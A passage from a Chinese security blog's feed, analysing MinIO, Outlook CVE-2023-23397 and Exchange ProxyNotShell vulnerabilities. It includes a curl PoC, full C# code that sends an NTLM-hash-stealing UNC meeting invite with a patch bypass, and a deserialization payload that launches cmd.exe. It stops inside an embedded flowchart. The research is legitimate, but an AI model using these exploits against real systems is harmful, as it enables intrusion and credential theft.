style="color:#a6e22e">HealthHandler</span>))</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#a6e22e">subrouter</span>.<span style="color:#a6e22e">Methods</span>(<span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">MethodPost</span>).<span style="color:#a6e22e">Path</span>(<span style="color:#a6e22e">bootstrapRESTVersionPrefix</span><span style="color:#f92672">+</span><span style="color:#a6e22e">bootstrapRESTMethodVerify</span>).<span style="color:#a6e22e">HandlerFunc</span>(</span></span><span style="display:flex;"><span><span style="color:#a6e22e">h</span>(<span style="color:#a6e22e">server</span>.<span style="color:#a6e22e">VerifyHandler</span>))</span></span><span style="display:flex;"><span>}</span></span><span style="display:flex;"><span><span style="color:#a6e22e">minioReservedBucket</span> =<span style="color:#e6db74">"minio"</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">minioReservedBucketPath</span> =<span style="color:#a6e22e">SlashSeparator</span><span style="color:#f92672">+</span><span style="color:#a6e22e">minioReservedBucket</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">bootstrapRESTPrefix</span> =<span style="color:#a6e22e">minioReservedBucketPath</span><span style="color:#f92672">+</span><span style="color:#e6db74">"/bootstrap"</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> (</span></span><span style="display:flex;"><span><span style="color:#a6e22e">bootstrapRESTVersion</span> =<span style="color:#e6db74">"v1"</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">bootstrapRESTVersionPrefix</span> =<span style="color:#a6e22e">SlashSeparator</span><span style="color:#f92672">+</span><span style="color:#a6e22e">bootstrapRESTVersion</span></span></span><span style="display:flex;"><span>)</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> (</span></span><span style="display:flex;"><span><span style="color:#a6e22e">bootstrapRESTMethodVerify</span> =<span style="color:#e6db74">"/verify"</span></span></span><span style="display:flex;"><span>)</span></span></code></pre></div><p>综合可得，触发漏洞方法为向<code>/minio/bootstrap/v1/verify</code>接口发送POST请求即可，除了对verify接口做鉴权之外，补丁中还在输出中去除了密钥等敏感信息。
![[../images/Pasted image 20231007234853.png]]</p><p>PoC</p><pre tabindex="0"><code>curl -X POST http://target/minio/bootstrap/v1/verify</code></pre><h3 id="小结">小结</h3><p>这个漏洞分析起来较为简单，由于Minio是go开发的，直接RCE比较难，目前RCE方式是通过信息泄露获取到管理员密钥登录，而后替换更新链接，在使用minio自带的mc工具进行更新，将当前minio实例替换为带有后门版本的minio，从而执行任意代码。</p><p><strong>参考链接</strong></p><blockquote><p><a href="https://github.com/minio/minio/compare/RELEASE.2023-03-13T19-46-17Z...RELEASE.2023-03-20T20-16-18Z" target="_blank">https://github.com/minio/minio/compare/RELEASE.2023-03-13T19-46-17Z&hellip;RELEASE.2023-03-20T20-16-18Z</a></p></blockquote><p>创建于2023-10-06</p><p><strong>Created at 2023-05-05T20:53:41+08:00</strong></p></description></item><item><title>CVE-2023-23397 Outlook 权限提升漏洞分析</title><link>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-23397-outlook-eop/</link><pubDate>Fri, 05 May 2023 20:50:19 +0800</pubDate><guid>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-23397-outlook-eop/</guid><description><h3 id="基本信息">基本信息</h3><p>Microsoft Outlook 存在权限提升漏洞，未经身份验证的远程攻击者可通过向受害者发送特制的带有UNC地址的电子邮件来利用此漏洞，当受害者所用的outlook处于打开状态时，outlook收到的会议提醒过期时会尝试连接攻击者指定的外部 UNC 位置。这会将受害者的Net-NTLMv2 hash泄露给攻击者，然后攻击者可以将其中继到另一个服务，进而获得该用户权限。</p><p>在微软发布的补丁中对该漏洞修复不完全，只限制了所用UNC路径中不能含有”.”，攻击者可以使用诸如\aaa\形式的UNC路径对其绕过。</p><p>给Exchange邮箱发送带有ReminderFileParameter属性并指向UNC路径，ReminderOverride设为true，ReminderSet设为true即可触发</p><h3 id="影响版本">影响版本</h3><p>略</p><h3 id="环境搭建">环境搭建</h3><ul><li>outlook 2016</li><li>windows 2019 + AD域</li></ul><h3 id="技术分析调试">技术分析&amp;调试</h3><p>根据微软文档，Outlook会议可以设置PidLidReminderFileParameter和PidLidReminderOverride属性，其含义分别为：指定客户在该对象的提醒过期时应播放的声音的文件名和Outlook客户端是否应该保留PidLidReminderFileParameter属性的值。攻击者在发送给受害者的会议里面设置PidLidReminderFileParameter和PidLidReminderOverride属性，当会议过期时outlook会尝试解析PidLidReminderFileParameter属性并尝试播放PidLidReminderFileParameter指向的路径的声音文件(.wav)，但outlook解析时并未限制PidLidReminderFileParameter属性指向的是本地文件还是网络文件。</p><p><img alt="" src="/images/vulnerability/CVE-2023-23397-Outlook-EoP.zh-cn.assets/1.png"/></p><p>即PidLidReminderFileParameter可以指向网络共享文件。攻击者将恶意会议邀请的PidLidReminderFileParameter属性设为攻击者控制的系统对应的UNC路径，并将PidLidReminderOverride属性设为true，将邀请发给受害者邮箱，当受害者在outlook上登录了邮箱时，outlook会自动获取该文件，当该路径参数为UNC路径时，outlook会以该用户身份向这个UNC路径对应的系统发起NTLM认证，尝试获取UNC路径指向的文件，此时攻击者可以获取到该认证hash，并将该hash中继到其他服务上，即可获取到受害者的权限。</p><p>该漏洞PoC先使用MsgKit库生成msg文件（outlook邮件格式），而后利用Aspose库读取msg文件并将其反序列化为MapiMessage对象，在其上添加ReminderSet并置为true，而后转换为MailMessage对象，通过smtpClient.Send发给受害者。从而触发漏洞，获取到受害者NTLM hash。 在微软2023年3月补丁日中对此漏洞进行了修复，但此漏洞修复不完全，只是限制了PidLidReminderFileParameter属性内不能含有”.”，导致攻击者可以使用\aaa\形式绕过此补丁。</p><p>PoC</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-csharp" data-lang="csharp"><span style="display:flex;"><span><span style="color:#66d9ef">using</span> System;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">using</span> Aspose.Email.Mapi;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">using</span> Aspose.Email;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">using</span> Aspose.Email.Clients.Smtp;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">namespace</span> MsgKit</span></span><span style="display:flex;"><span>{</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span><span style="color:#a6e22e">Program</span></span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">static</span><span style="color:#66d9ef">void</span> Main(<span style="color:#66d9ef">string</span>[] args)</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">string</span> lanPath =<span style="color:#e6db74">@"\\server\test\"</span>;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">string</span> saveFilePath =<span style="color:#e6db74">@"saveFilePath"</span>;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">using</span> (<span style="color:#66d9ef">var</span> appoionment =<span style="color:#66d9ef">new</span> Appointment(</span></span><span style="display:flex;"><span><span style="color:#66d9ef">new</span> Sender(<span style="color:#e6db74">"winserver@domain.com"</span>,<span style="color:#e6db74">"Sender"</span>),</span></span><span style="display:flex;"><span><span style="color:#66d9ef">new</span> Representing(<span style="color:#e6db74">"winserver@domain.com"</span>,<span style="color:#e6db74">"Sender"</span>),</span></span><span style="display:flex;"><span><span style="color:#e6db74">"pish"</span>))</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span> appoionment.Recipients.AddTo(<span style="color:#e6db74">"administrator@domain.com"</span>,<span style="color:#e6db74">"administrator"</span>);</span></span><span style="display:flex;"><span> appoionment.Subject =<span style="color:#e6db74">"pish"</span>;</span></span><span style="display:flex;"><span> appoionment.Location =<span style="color:#e6db74">"Virtual"</span>;</span></span><span style="display:flex;"><span> appoionment.MeetingStart = DateTime.Now.Date;</span></span><span style="display:flex;"><span> appoionment.MeetingEnd = DateTime.Now.Date.AddHours(<span style="color:#ae81ff">2</span>).Date;</span></span><span style="display:flex;"><span> appoionment.AllDay =<span style="color:#66d9ef">true</span>;</span></span><span style="display:flex;"><span> appoionment.BodyText =<span style="color:#e6db74">"hello, world"</span>;</span></span><span style="display:flex;"><span> appoionment.BodyHtml =<span style="color:#e6db74">"&lt;html>&lt;head>&lt;/head>&lt;body>&lt;b>hello, pls read it.&lt;/b>&lt;/body>&lt;/html>"</span>;</span></span><span style="display:flex;"><span> appoionment.SentOn = DateTime.UtcNow;</span></span><span style="display:flex;"><span> appoionment.Importance = MsgKit.Enums.MessageImportance.IMPORTANCE_NORMAL;</span></span><span style="display:flex;"><span> appoionment.IconIndex = MsgKit.Enums.MessageIconIndex.UnsentMail;</span></span><span style="display:flex;"><span> appoionment.PidLidReminderFileParameter = lanPath;</span></span><span style="display:flex;"><span> appoionment.PidLidReminderOverride =<span style="color:#66d9ef">false</span>;</span></span><span style="display:flex;"><span> appoionment.Save(saveFilePath);</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> msg = MapiMessage.Load(saveFilePath);</span></span><span style="display:flex;"><span> msg.SetProperty(KnownPropertyList.ReminderSet,<span style="color:#66d9ef">true</span>);</span></span><span style="display:flex;"><span> msg.SetProperty(KnownPropertyList.ReminderFileParameter, lanPath +<span style="color:#e6db74">"\a"</span>);</span></span><span style="display:flex;"><span> msg.SetProperty(KnownPropertyList.ReminderOverride,<span style="color:#66d9ef">true</span>);</span></span><span style="display:flex;"><span> SmtpClient smtpClient =<span style="color:#66d9ef">new</span> SmtpClient();</span></span><span style="display:flex;"><span> smtpClient.Host =<span style="color:#e6db74">"Host"</span>;</span></span><span style="display:flex;"><span> smtpClient.Username =<span style="color:#e6db74">"username"</span>;</span></span><span style="display:flex;"><span> smtpClient.Password =<span style="color:#e6db74">"Password"</span>;</span></span><span style="display:flex;"><span> smtpClient.Port =<span style="color:#ae81ff">587</span>;</span></span><span style="display:flex;"><span> smtpClient.SecurityOptions = Aspose.Email.Clients.SecurityOptions.SSLExplicit;</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">try</span></span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> options =<span style="color:#66d9ef">new</span> MailConversionOptions();</span></span><span style="display:flex;"><span> options.KeepOriginalEmailAddresses =<span style="color:#66d9ef">true</span>;</span></span><span style="display:flex;"><span> options.ConvertAsTnef =<span style="color:#66d9ef">true</span>;</span></span><span style="display:flex;"><span> options.PreserveEmbeddedMessageFormat =<span style="color:#66d9ef">true</span>;</span></span><span style="display:flex;"><span> options.PreserveRtfContent =<span style="color:#66d9ef">true</span>;</span></span><span style="display:flex;"><span> smtpClient.Send(msg.ToMailMessage(options));</span></span><span style="display:flex;"><span> Console.WriteLine(<span style="color:#e6db74">"success send"</span>);</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">catch</span> (Exception ex)</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span> Console.WriteLine(<span style="color:#e6db74">"error:"</span> + ex.ToString());</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span>}</span></span></code></pre></div><h3 id="小结">小结</h3><p>该漏洞是典型的逻辑漏洞，由于微软没有限制邮件的过期声音文件路径属性，导致可以设置这个属性为UNC路径来让outlook发起NTLM请求，尝试从网络加载文件，从而偷取NTLM hash。</p><p>第一次尝试使用outlook构造PoC时失败了，最后找到了C#的邮件库Aspose，通过修改Aspose库并利用该库就可以设置PidLidReminderFileParameter属性了。</p><p><strong>参考链接</strong></p><blockquote><p><a href="https://www.mdsec.co.uk/2023/03/exploiting-cve-2023-23397-microsoft-outlook-elevation-of-privilege-vulnerability/" target="_blank">https://www.mdsec.co.uk/2023/03/exploiting-cve-2023-23397-microsoft-outlook-elevation-of-privilege-vulnerability/</a></p><p><a href="https://github.com/Sicos1977/MsgKit" target="_blank">https://github.com/Sicos1977/MsgKit</a></p><p><a href="https://research.checkpoint.com/2023/the-obvious-the-normal-and-the-advanced-a-comprehensive-analysis-of-outlook-attack-vectors/" target="_blank">https://research.checkpoint.com/2023/the-obvious-the-normal-and-the-advanced-a-comprehensive-analysis-of-outlook-attack-vectors/</a></p></blockquote><p><strong>Created at 2023-05-05T20:50:19+08:00</strong></p></description></item><item><title>Proxy Not Shell 利用链分析</title><link>https://www.ch35tnut.site/zh-cn/vulnerability/proxy-not-shell/</link><pubDate>Fri, 05 May 2023 20:35:49 +0800</pubDate><guid>https://www.ch35tnut.site/zh-cn/vulnerability/proxy-not-shell/</guid><description><h3 id="漏洞环境">漏洞环境</h3><ul><li>Windows Server 2019</li><li>Windows Exchange 2019 CU9</li></ul><h3 id="漏洞分析">漏洞分析</h3><p>漏洞链包含了两个漏洞：</p><ul><li>CVE-2022-41040 Exchange 权限提升漏洞</li><li>CVE-2022-41082 Exchange 远程代码执行漏洞</li></ul><p>CVE-2022-41040 是ProxyShell修复不完全的产物，在ProxyShell利用链中无需身份验证就可以通过autodiscover.json请求到/PowerShell接口，在CVE-2022-41040 中，仅需要低权限身份验证就可以请求到该接口，通过SSRF将低权限转换为高权限。</p><p>CVE-2022-41082是Exchange的反序列化漏洞，通过传入恶意序列化数据，使得Exchange触发能够造成代码执行的反序列化过程，将指定数据反序列化到恶意类，从而在Exchange服务器上执行任意代码。</p><p>在PoC中发送了以下三种类型的PSRP消息</p><ul><li><p>0x00010002 SESSION_CAPABILITY</p><p>SESSION_CAPABILITY 应该是创建RunspacePool</p></li><li><p>0x00010004 INIT_RUNSPACEPOOL</p><p>INIT_RUNSPACEPOOL 应该是初始化RunspacePool</p></li><li><p>0x00021006 CREATE_PIPELINE</p><p>创建命令管道并在指定的 RunspacePool 中调用它</p></li></ul><p>PoC通过PSRP协议创建了远程PowerShell管道，并试图在这个管道内执行New-OfflineAddressBook这个cmdlet，并将对应的序列化数据传给了Exchange。</p><p>PoC主要组成部分如下所示，BA标签内是base64编码的序列化<em>System.UnitySerializationHolder</em>对象</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#f92672">&lt;Obj</span><span style="color:#a6e22e">N=</span><span style="color:#e6db74">"V"</span><span style="color:#a6e22e">RefId=</span><span style="color:#e6db74">"14"</span><span style="color:#f92672">></span></span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;TN</span><span style="color:#a6e22e">RefId=</span><span style="color:#e6db74">"2"</span><span style="color:#f92672">></span></span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;T></span>System.ServiceProcess.ServiceController<span style="color:#f92672">&lt;/T></span></span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;T></span>System.Object<span style="color:#f92672">&lt;/T></span></span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/TN></span></span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;ToString></span>System.ServiceProcess.ServiceController<span style="color:#f92672">&lt;/ToString></span></span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#f92672">&lt;Props></span></span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;S</span><span style="color:#a6e22e">N=</span><span style="color:#e6db74">"Name"</span><span style="color:#f92672">></span>Type<span style="color:#f92672">&lt;/S></span></span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;Obj</span><span style="color:#a6e22e">N=</span><span style="color:#e6db74">"TargetTypeForDeserialization"</span><span style="color:#f92672">></span></span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;TN</span><span style="color:#a6e22e">RefId=</span><span style="color:#e6db74">"2"</span><span style="color:#f92672">></span></span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;T></span>System.Exception<span style="color:#f92672">&lt;/T></span></span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;T></span>System.Object<span style="color:#f92672">&lt;/T></span></span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/TN></span></span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;MS></span></span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;BA</span><span style="color:#a6e22e">N=</span><span style="color:#e6db74">"SerializationData"</span><span style="color:#f92672">></span>AAEAAAD/////AQAAAAAAAAAEAQAAAB9TeXN0ZW0uVW5pdHlTZXJpYWxpemF0aW9uSG9sZGVyAwAAAAREYXRhCVVuaXR5VHlwZQxBc3NlbWJseU5hbWUBAAEIBgIAAAAgU3lzdGVtLldpbmRvd3MuTWFya3VwLlhhbWxSZWFkZXIEAAAABgMAAABYUHJlc2VudGF0aW9uRnJhbWV3b3JrLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49MzFiZjM4NTZhZDM2NGUzNQs=<span style="color:#f92672">&lt;/BA></span></span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/MS></span></span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/Obj></span></span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/Props></span></span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#f92672">&lt;S></span></span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;![CDATA[&lt;ResourceDictionary xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation" xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml" xmlns:System="clr-namespace:System;assembly=mscorlib" xmlns:Diag="clr-namespace:System.Diagnostics;assembly=system">&lt;ObjectDataProvider x:Key="LaunchCalch" ObjectType="{x:Type Diag:Process}" MethodName="Start">&lt;ObjectDataProvider.MethodParameters>&lt;System:String>cmd.exe&lt;/System:String>&lt;System:String>/c whoami> c:\users\public\1.txt&lt;/System:String> &lt;/ObjectDataProvider.MethodParameters> &lt;/ObjectDataProvider> &lt;/ResourceDictionary>]]></span></span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/S></span></span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/Obj></span></span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span>XamlReader.Parse()</span></span><span style="display:flex;"><span>BA标签数据</span></span><span style="display:flex;"><span>.....ÿÿÿÿ..............System.UnitySerializationHolder.....</span></span><span style="display:flex;"><span>Data UnityType.AssemblyName......... System.Windows.Markup.XamlReader.........</span></span><span style="display:flex;"><span>XPresentationFramework, Version=4.0.0.0, Culture=neutral,</span></span><span style="display:flex;"><span>PublicKeyToken=31bf3856ad364e35.</span></span></code></pre></div><p>PoC部分由两个对象嵌套而成，大致结构如下所示：</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span>Obj V(System.ServiceProcess.ServiceController):</span></span><span style="display:flex;"><span> String Name="Type"</span></span><span style="display:flex;"><span> Obj TargetTypeForDeserialization(System.Exception):</span></span><span style="display:flex;"><span> ByteArray SerializationData</span></span><span style="display:flex;"><span> String SerializationData</span></span></code></pre></div><p><strong>代码逻辑</strong></p><p>代码逻辑如下图</p><?xml version="1.0" encoding="UTF-8" standalone="no"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" xmlns:ev="http://www.w3.org/2001/xml-events" xmlns:v="http://schemas.microsoft.com/visio/2003/SVGExtensions/" width="10.4331in" height="18.8976in" viewBox="0 0 751.181 1360.63" xml:space="preserve" color-interpolation-filters="sRGB" class="st12"><v:documentProperties v:langID="2052" v:metric="true" v:viewMarkup="false"><v:userDefs><v:ud v:nameU="msvNoAutoConnect" v:val="VT0(0):26"/></v:userDefs></v:documentProperties><style type="text/css">
.st1 {fill:url(#grad3-4);stroke:none;stroke-linecap:round;stroke-linejoin:round;stroke-width:0.5}
.st2 {fill:#1ba1e2;stroke:#ffffff;stroke-linecap:round;stroke-linejoin:round;stroke-width:0.5}
.st3 {fill:#ffffff;font-family:Segoe UI;font-size:0.666664em}
.st4 {font-family:黑体;font-size:1em}
.st5 {font-size:1em}
.st6 {marker-end:url(#mrkr4-19);stroke:#1998d6;stroke-linecap:round;stroke-linejoin:round;stroke-width:0.5}
.st7 {fill:#1998d6;fill-opacity:1;stroke:#1998d6;stroke-opacity:1;stroke-width:0.16556291390728}
.st8 {fill:#ffffff;stroke:none;stroke-linecap:butt;stroke-width:7.2}
.st9 {fill:#1076a7;font-family:黑体;font-size:0.666664em}
.st10 {font-family:Segoe UI;font-size:1em}
.st11 {fill:#ffffff;font-family:黑体;font-size:0.666664em}
.st12 {fill:none;fill-rule:evenodd;font-size:12px;overflow:visible;stroke-linecap:square;stroke-miterlimit:3}</style><defs id="Patterns_And_Gradients"><radialGradient id="grad3-4" cx="0.5" cy="0.5" r="0.73"><stop offset="0" stop-color="#d2ecf9" stop-opacity="1"/><stop offset="1" stop-color="#e7f5fc" stop-opacity="1"/></radialGradient></defs><defs id="Markers"><g id="lend4"><path d="M 2 1 L 0 0 L 2 -1 L 2 1 " style="stroke:none"/></g><marker id="mrkr4-19" class="st7" v:arrowType="4" v:arrowSize="2" v:setback="12.08" refX="-12.08" orient="auto" markerUnits="strokeWidth" overflow="visible"><use xlink:href="#lend4" transform="scale(-6.04,-6.04) "/></marker></defs><g v:mID="4" v:index="1" v:groupContext="backgroundPage"><v:userDefs><v:ud v:nameU="msvVisioCreated" v:prompt="" v:val="VT0(0):26"/></v:userDefs><title>背景 1</title><v:pageProperties width="10.4331" height="18.8976" v:drawingScale="0.0393701" v:pageScale="0.0393701" v:drawingUnits="24" v:shadowOffsetX="8.50394" v:shadowOffsetY="-8.50394"/><g id="shape2-1" v:mID="2" v:groupContext="shape"><title>Center Gradient</title><v:userDefs><v:ud v:nameU="Background" v:val="VT0(0):26"/><v:ud v:nameU="visVersion" v:val="VT0(15):26"/><v:ud v:nameU="msvShapeCategories" v:prompt="" v:val="VT4(DoNotContain)"/><v:ud v:nameU="msvVisioCreated" v:prompt="" v:val="VT0(0):26"/></v:userDefs><rect x="0" y="0" width="751.181" height="1360.63" class="st1"/></g></g><g v:mID="0" v:index="2" v:groupContext="foregroundPage"><v:userDefs><v:ud v:nameU="msvThemeOrder" v:val="VT0(0):26"/></v:userDefs><title>页-1</title><v:pageProperties v:drawingScale="0.0393701" v:pageScale="0.0393701" v:drawingUnits="24" v:shadowOffsetX="8.50394" v:shadowOffsetY="-8.50394"/><v:layer v:name="流程图" v:index="0"/><v:layer v:name="连接线" v:index="1"/><g id="shape7-5" v:mID="7" v:groupContext="shape" v:layerMember="0" transform="translate(108.725,-1026.2)"><title>流程</title><desc>ReadOneObject</desc><v:custProps><v:cp v:nameU="Cost" v:lbl="成本" v:prompt="" v:type="7" v:format="@" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="ProcessNumber" v:lbl="流程编号" v:prompt="" v:type="2" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="Owner" v:lbl="所有者" v:prompt="" v:type="0" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="Function" v:lbl="职能" v:prompt="" v:type="0" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0" v:val="VT4()"/><v:cp v:nameU="StartDate" v:lbl="开始日期" v:prompt="" v:type="5" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="EndDate" v:lbl="结束日期" v:prompt="" v:type="5" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="Status" v:lbl="状态" v:prompt="" v:type="4" v:format=";未开始;进行中;已完成;已推迟;正在等待输入" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0" v:val="VT4()"/></v:custProps><v:userDefs><v:ud v:nameU="visVersion" v:prompt="" v:val="VT0(15):26"/><v:ud v:nameU="DefaultWidth" v:prompt="" v:val="VT0(0.98425196850394):24"/><v:ud v:nameU="DefaultHeight" v:prompt="" v:val="VT0(0.59055118110236):24"/><v:ud v:nameU="ResizeTxtHeight" v:prompt="" v:val="VT0(0.59055118110236):24"/></v:userDefs><v:textBlock v:margins="rect(2,2,2,2)" v:tabSpace="42.5197"/><v:textRect cx="51.5696" cy="1335.88" width="103.14" height="49.5068"/><rect x="0" y="1311.12" width="103.139" height="49.5068" class="st2"/><text x="23.69" y="1338.28" class="st3" v:langID="1033"><v:paragraph v:horizAlign="1"/><v:tabList/>ReadOneObject</text></g><g id="shape8-8" v:mID="8" v:groupContext="shape" v:layerMember="0" transform="translate(78.3257,-894.183)"><title>流程.8</title><desc>ReadOneDeserializedObject 遍历XML树的标签</desc><v:custProps><v:cp v:nameU="Cost" v:lbl="成本" v:prompt="" v:type="7" v:format="@" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="ProcessNumber" v:lbl="流程编号" v:prompt="" v:type="2" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="Owner" v:lbl="所有者" v:prompt="" v:type="0" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="Function" v:lbl="职能" v:prompt="" v:type="0" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0" v:val="VT4()"/><v:cp v:nameU="StartDate" v:lbl="开始日期" v:prompt="" v:type="5" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="EndDate" v:lbl="结束日期" v:prompt="" v:type="5" v:format="" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0"/><v:cp v:nameU="Status" v:lbl="状态" v:prompt="" v:type="4" v:format=";未开始;进行中;已完成;已推迟;正在等待输入" v:sortKey="" v:invis="false" v:ask="false" v:langID="2052" v:cal="0" v:val="VT4()"/></v:custProps><v:userDefs><v:ud v:nameU="visVersion" v:prompt="" v:val="VT0(15):26"/><v:ud v:nameU="DefaultWidth" v:prompt="" v:val="VT0(0.98425196850394):24"/><v:ud v:nameU="DefaultHeight" v:prompt="" v:val="VT0(0.59055118110236):24"/><v:ud v:nameU="ResizeTxtHeight" v:prompt="" v:val="VT0(0.59055118110236):24"/></v:userDefs><v:textBlock v:margins="rect(2,2,2,2)" v:tabSpace="42.5197"/><v:textRect cx="82.5114" cy="1335.88" width="165.03" height="49.5068"/><rect x="0" y="1311.12" width="165.023" height="49.5068" class="st2"/><text x="33.36" y="1333.08" class="st3" v:langID="1033"><v:paragraph v:horizAlign="1"/><v:tabList/>ReadOneDeserializedObject<v:newlineChar/><tspan x="50.68" dy="1.275em" class="st4" v:langID="2052">遍历</tspan><tspan class="st5" v:langID="2052">XML</tspan><tspan class="st4" v:langID="2052">树的标签</tspan></text></g><g id="shape10-14" v:mID="10" v:groupContext="shape" v:layerMember="1" transform="translate(153.479,-1026.2)"><title>动态连接线</title><desc>调用读取一个反序列化对象 object obj = this.ReadOneDeserializedObject</desc><v:textBlock v:margins="rect(4,4,4,4)" v:tabSpace="42.5197"/><v:textRect cx="7.35803" cy="1401.61" width="168.1" height="28.0064"/><path d="M6.82 1360.63 L6.82 1381.89 L7.36 1381.89 L7.36 1437.1" class="st6"/><rect v:rectContext="textBkgnd" x="-71.5903" y="1391.61" width="157.897" height="20.0025" class="st8"/><text x="-44.64" y="1399.42" class="st9" v:langID="2052"><v:paragraph v:horizAlign="1"/><v:tabList/>调用，读取一个反序列化对象<v:newlineChar/><tspan x="-71.59" dy="1.225em" class="st10" v:langID="1033">object obj</tspan><tspan class="st10" v:langID="1033">=</tspan><tspan class="st10" v:langID="1033">this</tspan><tspan class="st10" v:langID="1033">.</tspan><tspan class="st10" v:langID="1033">ReadOneDeserializedObject</tspan></text></g><g id="shape12-27" v:mID="12" v:groupContext="shape" v:layerMember="1" transform="translate(153.751,-894.183)"><title>动态连接线.12</title><desc>碰到Obj标签调用读取一个Obj对象 if (this.IsNextElement("Obj")){ return thi...</desc><v:textBlock v:margins="rect(4,4,4,4)" v:tabSpace="42.5197"/><v:textRect cx="7.08661" cy="1391.57" width="147.54" height="37.6064"/><path d="M7.09 1360.63 L7.09 1416.47" class="st6"/><rect v:rectContext="textBkgnd" x="-61.5847" y="1376.77" width="137.343" height="29.6027" class="st8"/><text x="-61.58" y="1384.57" class="st9" v:langID="2052"><v:paragraph v:horizAlign="1"/><v:tabList/>碰到<tspan class="st10">Obj</tspan>标签，调用，读取一个<tspan class="st10">Obj</tspan>对象<v:newlineChar/><tspan x="-44.17" dy="1.225em" class="st10" v:langID="1033">if</tspan><tspan class="st10" v:langID="1033">(</tspan><tspan class="st10" v:langID="1033">this</tspan><tspan class="st10" v:langID="1033">.</tspan><tspan class="st10" v:langID="1033">IsNextElement</tspan><tspan class="st10" v:langID="1033">("</tspan><tspan class="st10" v:langID="1033">Obj</tspan><tspan class="st10" v:langID="1033">"))</tspan><tspan class="st10" v:langID="1033">{<v:newlineChar/></tspan><tspan x="-41.28" dy="1.2em" class="st10" v:langID="1033">return this</tspan><tspan class="st10" v:langID="1033">.</tspan><tspan class="st10" v:langID="1033">ReadPSObject</tspan><tspan class="st10" v:langID="1033">()</tspan><tspan class="st10" v:langID="1033">;}</tspan></text></g><g 